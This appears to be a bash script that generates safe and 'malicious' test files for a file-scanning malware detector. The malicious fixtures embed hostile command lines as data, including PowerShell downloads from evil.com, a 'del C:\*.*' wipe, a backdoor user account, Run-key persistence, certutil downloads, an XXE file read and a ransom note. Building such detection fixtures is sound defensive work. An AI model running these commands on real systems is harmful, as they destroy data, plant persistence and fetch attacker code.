#!/bin/bash
# Generate test data for filesystem_analyzer
# Usage: bash generate_test_data.sh <output_dir>

set -e

OUTDIR="${1:-test_data}"
mkdir -p "$OUTDIR"

echo "Generating test data in: $OUTDIR"

# ==================== SAFE FILES ====================

# Safe PDF
printf '%%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%%%EOF' > "$OUTDIR/safe.pdf"

# Safe Office (minimal ZIP)
printf '\x50\x4b\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/safe.docx"

# Safe MP3 (ID3v1)
printf 'TAGSafe Song\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Artist\x00\x00\x00\x00\x00\x00Album\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Year\x00' > "$OUTDIR/safe.mp3"

# Safe MP4 (ISO base media file)
printf '\x00\x00\x00\x1c\x66\x74\x79\x70\x69\x73\x6f\x6d\x00\x00\x02\x00\x69\x73\x6f\x6d\x69\x73\x6f\x32\x6d\x70\x34\x31' > "$OUTDIR/safe.mp4"

# Safe WAV
printf 'RIFF\x00\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x01\x00\x44\xac\x00\x00\x88\x58\x01\x00\x02\x00\x10\x00data\x00\x00\x00\x00' > "$OUTDIR/safe.wav"

# Safe FLAC
printf 'fLaC\x00\x00\x00\x22\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/safe.flac"

# Safe MPG (MPEG-1)
printf '\x00\x00\x01\xba\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/safe.mpg"

# Safe AVI
printf 'RIFF\x00\x00\x00\x00AVI \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/safe.avi"

# Safe MKV/WebM (EBML)
printf '\x1a\x45\xdf\xa3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/safe.mkv"

# Safe MOV
printf '\x00\x00\x00\x14\x66\x74\x79\x70\x71\x74\x20\x00\x00\x00\x00\x6d\x6f\x6f\x76\x6d\x70\x34\x31' > "$OUTDIR/safe.mov"

# Safe OGG
printf 'OggS\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/safe.ogg"

# Safe AAC
printf '\xff\xf1\x50\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/safe.aac"

# Safe FLAC
printf 'fLaC\x00\x00\x00\x22\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/safe.flac"

# ==================== MALICIOUS PDF ====================

# PDF with JavaScript
printf '%%PDF-1.4\n1 0 obj<</Type/Catalog/Names<</JavaScript<<\x00\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00>>>>>endobj\ntrailer<</Root 1 0 R>>\n%%%%EOF' > "$OUTDIR/mal_pdf_js.pdf"

# PDF with Launch action
printf '%%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction<</S/Launch/F(test.exe)>>>>endobj\ntrailer<</Root 1 0 R>>\n%%%%EOF' > "$OUTDIR/mal_pdf_launch.pdf"

# ==================== MALICIOUS OFFICE ====================

# DOCX with macro
printf '\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00word/vbaProject.bin\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_docx_macro.docx"

# XLSX with macro
printf '\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00xl/vbaProject.bin\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_xlsx_macro.xlsx"

# ==================== MALICIOUS ARCHIVES ====================

# ZIP with path traversal
printf '\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00../../../etc/passwd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_zip_traversal.zip"

# ZIP with executable
printf '\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00malware.exe\x00MZ\x90\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_zip_exe.zip"

# ==================== MALICIOUS SCRIPTS ====================

# PowerShell with suspicious commands
cat > "$OUTDIR/mal_ps1.ps1" << 'EOF'
$IEX = Invoke-Expression
$wc = New-Object Net.WebClient
$wc.DownloadString("http://evil.com/payload.ps1")
Start-Process calc.exe
Set-ExecutionPolicy Bypass
EOF

# VBS with suspicious commands
cat > "$OUTDIR/mal_vbs.vbs" << 'EOF'
Set obj = CreateObject("WScript.Shell")
obj.Run "cmd.exe /c del C:\*.*"
Set http = CreateObject("MSXML2.XMLHTTP")
eval("alert('xss')")
EOF

# Batch with suspicious commands
cat > "$OUTDIR/mal_bat.bat" << 'EOF'
net user hacker pass123 /add
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d "C:\malware.exe"
powershell -enc JABjAGwA...
certutil -urlcache -f http://evil.com/file.exe
EOF

# JavaScript with suspicious
cat > "$OUTDIR/mal_js.js" << 'EOF'
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://evil.com/data");
eval(atob("YWxlcnQoJ3hzc19oZXJlJyk="));
document.write("<script>alert(1)</script>");
ActiveXObject("WScript.Shell");
EOF

# ==================== MALICIOUS MEDIA FILES ====================

# MP3 with malicious ID3 (URL + suspicious content)
printf 'TAGTitle\x00http://evil.com/payload.exe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Artist\x00\x00\x00\x00powershell -enc JABjAGwA\x00\x00\x00Album\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Year\x00' > "$OUTDIR/mal_mp3_id3.mp3"

# MP3 with PowerShell in ID3
printf 'TAGTitle\x00Invoke-Expression\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Artist\x00DownloadString\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Album\x00IEX\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Year\x00' > "$OUTDIR/mal_mp3_ps.mp3"

# MP4 with embedded URL in metadata
printf '\x00\x00\x00\x1c\x66\x74\x79\x70\x69\x73\x6f\x6d\x00\x00\x02\x00\x69\x73\x6f\x6d\x69\x73\x6f\x32\x6d\x70\x34\x31http://evil.com/payload.exe\x00' > "$OUTDIR/mal_mp4_url.mp4"

# MP4 with JavaScript
printf '\x00\x00\x00\x1c\x66\x74\x79\x70\x69\x73\x6f\x6d\x00\x00\x02\x00<script>eval(atob("YWxlcnQoMSk="))</script>\x00\x00\x00\x00' > "$OUTDIR/mal_mp4_js.mp4"

# MP4 with long URL (exfiltration)
LONG_URL="https://evil.com/data/exfil?data=$(python3 -c 'print(\"A\"*150)')"
printf '\x00\x00\x00\x1c\x66\x74\x79\x70\x69\x73\x6f\x6d\x00\x00\x02\x00%s\x00' "$LONG_URL" > "$OUTDIR/mal_mp4_longurl.mp4"

# MP4 with IP-based URL
printf '\x00\x00\x00\x1c\x66\x74\x79\x70\x69\x73\x6f\x6d\x00\x00\x02\x00https://192.168.1.100/malware.exe\x00\x00\x00' > "$OUTDIR/mal_mp4_ipurl.mp4"

# AVI with suspicious URL
printf 'RIFF\x00\x00\x00\x00AVI \x00\x00\x00\x00http://evil.com/payload.exe\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_avi_url.avi"

# AVI with PowerShell
printf 'RIFF\x00\x00\x00\x00AVI \x00\x00\x00\x00powershell -enc JABjAGwA\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_avi_ps.avi"

# WAV with base64 content
printf 'RIFF\x00\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x01\x00\x44\xac\x00\x00\x88\x58\x01\x00\x02\x00\x10\x00data\x00\x00\x00\x00SGVsbG8gV29ybGQhIFRoaXMgaXMgYmFzZTY0IGVuY29kZWQgY29udGVudCBmb3IgZXhhZmlsdHJhdGlvbiEAAA=' > "$OUTDIR/mal_wav_b64.wav"

# WAV with registry modification
printf 'RIFF\x00\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x01\x00\x44\xac\x00\x00\x88\x58\x01\x00\x02\x00\x10\x00data\x00\x00\x00\x00reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Malware' > "$OUTDIR/mal_wav_reg.wav"

# FLAC with suspicious comment (base64)
printf 'fLaC\x00\x00\x00\x22\x00\x00\x00\x00\x00\x00\x00\x00\x00COMMENT\x00Invoke-Expression\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_flac_comment.flac"

# FLAC with URL in metadata
printf 'fLaC\x00\x00\x00\x22\x00\x00\x00\x00\x00\x00\x00\x00http://evil.com/payload.exe\x00COMMENT\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_flac_url.flac"

# MPG with JavaScript
printf '\x00\x00\x01\xba\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00<script>eval(atob("YWxlcnQoMSk="))</script>\x00\x00\x00' > "$OUTDIR/mal_mpg_js.mpg"

# MPG with WMI command
printf '\x00\x00\x01\xba\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00winmgmt::IWbemServices\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_mpg_wmi.mpg"

# MKV with XXE
printf '\x1a\x45\xdf\xa3\x00\x00\x00\x00<!ENTITY xxe SYSTEM "file:///etc/passwd">\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_mkv_xxe.mkv"

# MKV with network indicator
printf '\x1a\x45\xdf\xa3\x00\x00\x00\x00socket connect() tcp://192.168.1.1:443\x00\x00\x00\x00\x00' > "$OUTDIR/mal_mkv_net.mkv"

# MOV with crypto API
printf '\x00\x00\x00\x14\x66\x74\x79\x70\x71\x74\x20\x00\x00\x00\x00CryptEncrypt RsaEncrypt AesEncrypt\x00' > "$OUTDIR/mal_mov_crypto.mov"

# MOV with embedded executable header
printf '\x00\x00\x00\x14\x66\x74\x79\x70\x71\x74\x20\x00\x00\x00\x00MZ\x90\x00\x03\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_mov_mz.mov"

# OGG with suspicious URL
printf 'OggS\x00\x02\x00\x00\x00\x00\x00\x00\x00http://evil.com/payload.exe\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_ogg_url.ogg"

# OGG with PowerShell
printf 'OggS\x00\x02\x00\x00\x00\x00\x00\x00\x00powershell -enc JABjAGwA\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_ogg_ps.ogg"

# AAC with URL
printf '\xff\xf1\x50\x80\x00\x00\x00\x00http://evil.com/data\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > "$OUTDIR/mal_aac_url.aac"

# ==================== RANSOMWARE INDICATORS ====================

# File with ransomware text
cat > "$OUTDIR/ransom_note.txt" << 'EOF'
YOUR FILES HAVE BEEN ENCRYPTED!
Send 0.5 bitcoin to wallet: 1A2B3C4D5E6F7G8H9I0J
To decrypt your files, contact us at: evil@onion.com
Deadline: 24 hours
All your important files are encrypted: .doc, .jpg, .pdf, .xlsx
Decrypt or lose everything!
EOF

echo "Test data generated successfully!"
echo "Files created in: $OUTDIR"
echo ""
echo "Safe files:"
ls -1 "$OUTDIR" | grep "^safe\." | sort
echo ""
echo "Malicious files:"
ls -1 "$OUTDIR" | grep "^mal\|ransom" | sort
